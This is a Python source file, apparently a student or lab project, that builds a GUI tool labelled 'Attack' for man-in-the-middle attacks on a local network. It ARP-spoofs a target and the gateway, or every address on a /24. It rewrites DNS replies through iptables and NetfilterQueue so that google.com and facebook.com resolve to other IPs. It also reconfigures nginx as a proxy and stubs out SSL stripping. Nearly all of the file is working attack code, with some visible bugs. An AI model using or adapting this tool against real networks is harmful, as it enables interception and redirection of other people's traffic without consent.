import PySimpleGUI27 as sg
import sys
from scapy.all import *
import os
import logging as logging
from netfilterqueue import NetfilterQueue
import threading

# setconfigfile("estctwist.nl", "/etc/nginx/sites-enabled/default.conf")
def setconfigfile(website, path):
    f = open(path, "w")
    f.write("""
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    root /var/www/html;
    server_name _;
    location / {
        try_files $uri $uri/ =404;
        proxy_pass https://{hostname}
    }
}
""".format(hostname = website))
    f.close()
    os.system("sudo service nginx restart")

attackerIp = 0 #ip adress attacker, automatic, interface as GUI variable
TargetIP = '10.0.123.4' #GUI variable, target ip
RouterIP = '192.168.2.254' #GUI variable, gateway, evt automatisch
targetIp = TargetIP
hostIp = RouterIP #host = router
includeSSL = False
guessIP = '10.0.123.'
silent = True

choice1 = sg.Checkbox("SSL Stripping", default=False)
t1 = sg.Input('', enable_events=True, key='-INPUT-', font=('Arial Bold', 20), justification='left')
t2 = sg.Input('', enable_events=True, key='-INPUT2-', font=('Arial Bold', 20), justification='left')
t3 = sg.Input('', enable_events=True, key='-INPUT3-', font=('Arial Bold', 20), justification='left')
choice2 = sg.Checkbox("ARP Silent mode", default=False)

text1 = sg.Text("Do you want to include SSL stripping?")
text2 = sg.Text("Insert target IP")
text3 = sg.Text("Insert target domain")
text4 = sg.Text("Insert network interface")
text5 = sg.Text("DNS Silent mode")

endButton = sg.Button("End attack", visible = False)
    
attackButton = sg.Button("Attack!")
    
layout = [[choice1], [choice2], [text2], [t1], [text3], [t2], [text4], [t3], [attackButton], [endButton]]
window = sg.Window("Attack", layout)

def spoof(targetIp, hostIp, attackerIp):

    targetMac = getmacbyip(targetIp)
    attackerMac = get_if_hwaddr('enp0s10') #get attacker MAC
    hostMac = getmacbyip(hostIp)
    
    #send packet "host" to server    
    arp = Ether() / ARP()
    arp[Ether].src = attackerMac
    arp[ARP].hwsrc = attackerMac
    arp[ARP].psrc = hostIp
    arp[ARP].hwdst = targetMac
    arp[ARP].pdst = targetIp
        
    sendp(arp, iface="enp0s10")
    
    #send packet "server" to host
    arp2 = Ether() / ARP()
    arp2[Ether].src = attackerMac
    arp2[ARP].hwsrc = attackerMac
    arp2[ARP].psrc = targetIp
    arp2[ARP].hwdst = hostMac
    arp2[ARP].pdst = hostIp

    sendp(arp2, iface="enp0s10")
    
def full_spoof(targetIP, hostIP, attackerIP):
    #loop trough every ip that could be on your network and be the MITM on all of them
    for x in range(0, 255):
        y = str(x)
        targetIP = targetIP + y
        spoof(targetIP, hostIP, attackerIP)
        targetIP = guessIP
        
        
def end_spoof(targetIp, hostIp, attackerIp):
        
    targetMac = getmacbyip(targetIp)
    attackerMac = getmacbyip(attackerIp)
    hostMac = getmacbyip(hostIp)
        
    #undo ARP spoofing
    correctARP = Ether() / ARP()
    correctARP[Ether].src = attackerMac
    correctARP[ARP].hwsrc = hostMac
    correctARP[ARP].psrc = hostIp
    correctARP[ARP].hwdst = targetMac
    correctARP[ARP].pdst = targetIp
    sendp(correctARP, iface="enp0s10")
    
class DNSSpoof:
    def __init__(self, dictionary, queueNum):
        self.dictionary = dictionary
        self.queueNum = queueNum
        self.queue = NetfilterQueue()
 
    def __call__(self):
        print("Spoofing....")
        #{self.queueNum}
        os.system('sudo iptables -I FORWARD -d 10.0.123.4 -j NFQUEUE --queue-num 1')
        self.queue.bind(self.queueNum, self.poison)
        try:
            self.queue.run()
            print 'queue run: '
        except KeyboardInterrupt:
            os.system('sudo iptables -D FORWARD -j NFQUEUE --queue-num 1')
            print("[!] iptable rule flushed")
 
    def poison(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(DNSRR):
            try:
                queryName = scapyPacket[DNSQR].qname
                if queryName in self.dictionary:
                    scapyPacket[DNS].an = DNSRR(
                        rrname=queryName, rdata=self.dictionary[queryName])
                    scapyPacket[DNS].ancount = 1
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    del scapyPacket[Ether].chksum
                    print "modified", queryName
                    packet.set_payload(bytes(scapyPacket))
                else:
                    print("not modified")
            except IndexError as error:
                log.error(error)
            packet.set_payload(bytes(scapyPacket))
        return packet.accept()
        
        

def DNSLoop():        
    if __name__ == '__main__':
        try:
            #ip adresses that we want to spoof
            dictionary = {
                b"google.com.": "157.240.201.35",
                b"www.google.com.": "157.240.201.35",
                b"www.facebook.com.": "142.251.39.100",
                b"facebook.com.": "142.251.39.100"
            }
            queueNum = 1
            dnsspoof = DNSSpoof(dictionary, queueNum)
            dnsspoof()
        except OSError as error:
            log.error(error)


def ARPLoop():
    try: #different thread
    
        while True:
        
            if silent == False:
                full_spoof(guessIp, hostIp, attackerIp)
            else:
                spoof(targetIp, hostIp, attackerIp)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print('stopping attack')
        end_spoof(targetIp, hostIp, attackerIp)
        end_spoof(hostIp, targetIp, attackerIp)

def SSLLoop():
    #SSL code
    print("SSL Test")

while True:
    event, values = window.read()
    if event == "Attack!" or event == None:
        includeSSL = values[0]
        silent = values[1]
        TargetIP = layout[3][0].get()
        RouterIP = layout[5][0].get()
        targetIp = TargetIP
        hostIp = RouterIP
        
        attackerIp = get_if_addr(layout[7][0].get())
        
        thread1 = threading.Thread(target=ARPLoop);
        thread1.start(); 
        
        thread2 = threading.Thread(target=DNSLoop);
        thread2.start();
        
        if includeSSL == True:
            thread3 = threading.Thread(target=SSLLoop);
            thread3.start();
        
        endButton = sg.Button("End attack", visible = True);
        window['End attack'].update(visible = True)
        window['Attack!'].update(visible = False)
        
    if event == "End attack" or event == None:
        end_spoof(targetIp, hostIp, attackerIp)
        end_spoof(hostIp, targetIp, attackerIp)   
        
window.close()